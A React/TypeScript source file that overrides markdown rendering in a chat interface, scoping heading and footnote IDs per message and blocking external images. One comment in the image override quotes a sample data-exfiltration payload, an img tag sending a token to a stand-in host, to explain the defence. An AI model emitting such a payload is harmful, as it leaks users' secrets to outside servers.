import {
  createElement,
  isValidElement,
  useMemo,
  type JSX,
  type ReactNode,
} from 'react'
import { MarkdownTable } from '@/components/common/MarkdownTable'

/** Flatten a React node tree to its text content (for deriving a heading slug). */
function nodeToText(node: ReactNode): string {
  if (node == null || typeof node === 'boolean') return ''
  if (typeof node === 'string' || typeof node === 'number') return String(node)
  if (Array.isArray(node)) return node.map(nodeToText).join('')
  if (isValidElement(node)) {
    return nodeToText((node.props as { children?: ReactNode }).children)
  }
  return ''
}

/**
 * GitHub-style heading slug (approximation): lowercase, drop punctuation except
 * word chars / spaces / hyphens, spaces→hyphens, collapse + trim hyphens. Used
 * for BOTH the heading `id` and the hash-link target so `[Foo](#foo)` resolves.
 */
function slugifyHeading(text: string): string {
  return text
    .trim()
    .toLowerCase()
    .replace(/[^\w\s-]/g, '')
    .replace(/\s+/g, '-')
    .replace(/-+/g, '-')
    .replace(/^-+|-+$/g, '')
}

/** decodeURIComponent that never throws on a malformed `%` sequence. */
function safeDecode(s: string): string {
  try {
    return decodeURIComponent(s)
  } catch {
    return s
  }
}

/**
 * Returns Streamdown component overrides shared by all markdown renderers in the chat module.
 * Pass a unique `contentId` to scope footnote + heading DOM IDs — prevents cross-message ID
 * collisions when multiple messages contain the same footnote numbers / heading text, and lets
 * in-markdown hash links (`[Section](#section)`) scroll to THIS message's heading.
 */
export function useStreamdownComponents(contentId: string) {
  return useMemo(() => {
    // A slugged, message-scoped `id` on each heading so in-markdown hash links
    // resolve to THIS message's heading (never a same-slug heading in another
    // message). Respects an id the source already set (e.g. footnote anchors).
    const headingId = (children: ReactNode, existing?: string) => {
      if (existing) return existing
      const slug = slugifyHeading(nodeToText(children))
      return slug ? `${contentId}-h-${slug}` : undefined
    }
    const makeHeading =
      (level: 1 | 2 | 3 | 4 | 5 | 6) =>
      (props: JSX.IntrinsicElements['h1']) =>
        createElement(`h${level}`, {
          ...props,
          id: headingId(props.children, props.id),
        })

    return {
      // Replace Streamdown's native-scroller + in-page-fullscreen table wrapper
      // with our OverlayScrollbars + open-in-popup-window version.
      table: MarkdownTable,
      h1: makeHeading(1),
      h3: makeHeading(3),
      h4: makeHeading(4),
      h5: makeHeading(5),
      h6: makeHeading(6),
      h2(props: JSX.IntrinsicElements['h2']) {
        if (
          props.id === 'footnote-label' ||
          props.id === 'user-content-footnote-label'
        ) {
          // Suppressed — the section override renders "References" via <summary>
          return null
        }
        return <h2 {...props} id={headingId(props.children, props.id)} />
      },
      section(props: JSX.IntrinsicElements['section']) {
        const { children, ...rest } = props
        if ((rest as Record<string, unknown>)['data-footnotes'] === undefined) {
          return <section {...rest}>{children}</section>
        }
        // Collapsed by default (no `open` attribute)
        return (
          <details className="footnote-section mt-4">
            <summary>References</summary>
            {children}
          </details>
        )
      },
      a(props: JSX.IntrinsicElements['a']) {
        const { href, className, target: _target, id, ...rest } = props
        // Hide ↩ back-reference icons — they produce stray icons when footnote
        // definitions contain \n\n (multi-paragraph footnotes).
        // Check both class (older remark-gfm) and attribute (remark-gfm v4).
        if (
          className?.includes('data-footnote-backref') ||
          (rest as Record<string, unknown>)['data-footnote-backref'] !== undefined
        ) {
          return null
        }
        // Scope footnote IDs/hrefs to this content block so clicking [1] in message 2
        // scrolls to message 2's references, not message 1's (duplicate DOM IDs issue).
        const scopedId = id?.startsWith('user-content-fnref-')
          ? `${contentId}-fnref-${id.slice('user-content-fnref-'.length)}`
          : id
        const scopedHref = href?.startsWith('#user-content-fn-')
          ? `#${contentId}-fn-${href.slice('#user-content-fn-'.length)}`
          : href?.startsWith('#user-content-fnref-')
          ? `#${contentId}-fnref-${href.slice('#user-content-fnref-'.length)}`
          : href?.startsWith('#')
          ? // A plain in-markdown hash link (`[Section](#section)`): re-target it
            // at this message's slugged heading id (same slugify as the heading).
            `#${contentId}-h-${slugifyHeading(safeDecode(href.slice(1)))}`
          : href
        // All hash links — scroll within the current page
        if (scopedHref?.startsWith('#')) {
          return (
            <a
              {...rest}
              id={scopedId}
              href={scopedHref}
              className={className}
              onClick={(e) => {
                e.preventDefault()
                const target = document.getElementById(scopedHref.slice(1))
                if (target) {
                  // Open the outer .footnote-section <details>
                  target.closest('details')?.setAttribute('open', '')
                  // Open any .footnote-quote <details> inside the target <li>
                  target.querySelectorAll('details').forEach((d) => d.setAttribute('open', ''))
                  target.scrollIntoView({ behavior: 'smooth', block: 'start' })
                }
              }}
            />
          )
        }
        // External links — open in new tab
        return <a id={scopedId} href={scopedHref} className={className} {...rest} target="_blank" rel="noreferrer" />
      },
      blockquote(props: JSX.IntrinsicElements['blockquote']) {
        return (
          <details className="footnote-quote">
            <summary>Cited excerpt</summary>
            <blockquote {...props} />
          </details>
        )
      },
      img(props: JSX.IntrinsicElements['img']) {
        // Block external img src to prevent data-exfil via
        // `<img src="https://exfil.test/?token=...">` embedded in
        // markdown. Streamdown 2's default `allowedImagePrefixes: ['*']`
        // would allow this, and the `urlTransform` prop doesn't apply
        // to raw-HTML img tags (only markdown `![](url)` syntax).
        // Doing the check at the React component level catches both.
        const src = props.src
        if (typeof src !== 'string' || src.length === 0) return null
        if (src.startsWith('/')) return <img {...props} />
        if (src.startsWith('data:')) return null
        try {
          const u = new URL(src, window.location.origin)
          if (u.origin === window.location.origin) return <img {...props} />
        } catch {
          /* malformed */
        }
        return null
      },
      li(props: JSX.IntrinsicElements['li']) {
        const { id, className, ...rest } = props
        // Scope footnote definition IDs to avoid cross-message duplicates
        const scopedId = id?.startsWith('user-content-fn-')
          ? `${contentId}-fn-${id.slice('user-content-fn-'.length)}`
          : id
        // Re-apply Streamdown's default li classes (our override replaces its renderer,
        // losing "py-1 [&>p]:inline" which keeps the number and text on the same line)
        const mergedClassName = ['py-1', '[&>p]:inline', className].filter(Boolean).join(' ')
        return <li id={scopedId} className={mergedClassName} {...rest} />
      },
    }
  }, [contentId])
}
